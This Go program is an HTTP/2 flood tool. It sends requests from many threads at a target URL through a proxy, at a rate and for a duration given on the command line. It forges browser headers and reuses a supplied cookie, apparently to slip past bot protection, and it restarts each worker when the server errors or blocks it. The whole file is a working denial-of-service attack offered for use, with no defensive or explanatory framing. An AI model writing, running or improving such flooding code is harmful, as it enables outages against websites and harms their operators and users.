package main

import (
    "fmt"
    "net/http"
    "net/url"
    "time"
    "os"
    "strconv"
    "crypto/tls"
    "math/rand"
    "sync"
    "net"
    // "bufio"
    // "strings"
)

var proxies string
var cookie string
var useragent string

func http2(wg * sync.WaitGroup, target string, rps int) {
    restart: 
    proxy := fmt.Sprintf("http://%s", proxies)
    config := &tls.Config{
        InsecureSkipVerify: true,
        MinVersion:         tls.VersionTLS12,
        NextProtos:         []string{"h2"},
        CurvePreferences: []tls.CurveID{
            tls.X25519,
            tls.CurveP256,
            tls.CurveP384,
            tls.CurveP521,
        },
        CipherSuites: []uint16{
            tls.TLS_AES_128_GCM_SHA256,
            tls.TLS_AES_256_GCM_SHA384,
            tls.TLS_CHACHA20_POLY1305_SHA256,
            tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
        },
        PreferServerCipherSuites: true,
    }
    url, _ := url.Parse(proxy)
    httptransport := &http.Transport{
      Proxy: http.ProxyURL(url),
      ForceAttemptHTTP2: true,
      TLSClientConfig: config,
      Dial: (&net.Dialer{
        Timeout:   30 * time.Second,
        KeepAlive: 30 * time.Second,
        DualStack: true,
      }).Dial,
      DialTLS: func(network, addr string) (net.Conn, error) {
			  dialer := &net.Dialer{
				  Timeout: 5 * time.Second,
			  }
			  conn, err := dialer.Dial(network, addr)
			  if err != nil {
				  return nil, err
			  }
			  tlsConn := tls.Client(conn, config)
			  err = tlsConn.Handshake()
			  if err != nil {
				  return nil, err
			  }
			  return tlsConn, nil
		  },
    }
    client := http.Client{
        Transport: httptransport,
    }
    req, _ := http.NewRequest("GET", target, nil)
    
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("Accept-Language", "en-US,en;q=0.9")
    req.Header.Set("Cache-Control", "max-age=0")
    req.Header.Set("Sec-Ch-Ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
    req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
    req.Header.Set("Sec-Ch-Ua-Platform", "\"Linux\"")
    req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
    req.Header.Set("Sec-Fetch-Site", "same-origin")
    req.Header.Set("Sec-Fetch-User", "?1")
    req.Header.Set("Upgrade-Insecure-Requests", "1")
    req.Header.Set("User-Agent", useragent)
    req.Header.Set("X-Requested-With", "XMLHttpRequest")
    req.Header.Set("Connection", "keep-alive")
    req.Header.Set("Pragma", "no-cache")
    //req.Header.Set("Sec-GPC", "1")
    req.Header.Set("downlink", "1.7")
    req.Header.Set("sec-ch-ua-arch", "x86")
    req.Header.Set("sec-ch-ua-bitness", "64")
    req.Header.Set("dpr", "2.0")
    req.Header.Set("rtt", "510")
    req.Header.Set("ect", "4g")
    req.Header.Set("x-forwarded-proto", "https")
    //req.Header.Set("sec-ch-ua-platform-version", "Linux")
    req.Header.Set("sec-ch-ua-platform", "10.0")
	req.Header.Set("Cookie", cookie)
	// req.Header.Set("user-agent", useragent)
	// fmt.Println(useragent)

    for {
        for i := 0; i < rps; i++ {
            resp, err := client.Do(req)
            if err != nil {
                goto restart
            }
            if resp.StatusCode >= 400 && resp.StatusCode != 404 {
                goto restart
            }
        }

        time.Sleep(1 * time.Second)
    }
    defer wg.Done()
}

func main() {
    rand.Seed(time.Now().UnixNano())
    if len(os.Args) < 5 {
        fmt.Println("target time ratelimit proxyfile threads useragent cokoie")
        return
    }
    var target string
    var duration int
    var rps int
    // var proxies string
    var threads int
    var wg sync.WaitGroup
	
	target = os.Args[1]
    duration, _ = strconv.Atoi(os.Args[2])
    rps, _ = strconv.Atoi(os.Args[3])
    proxies = os.Args[4]
    threads, _ = strconv.Atoi(os.Args[5])
	useragent = os.Args[6]
	cookie = os.Args[7]

    for i := 0; i < threads; i++ {
        wg.Add(1)
        go http2(&wg, target, rps)
        time.Sleep(1 * time.Millisecond)
    }
    go func() {
      time.Sleep(time.Duration(duration) * time.Second)
      os.Exit(0)
    }()
    wg.Wait()
}
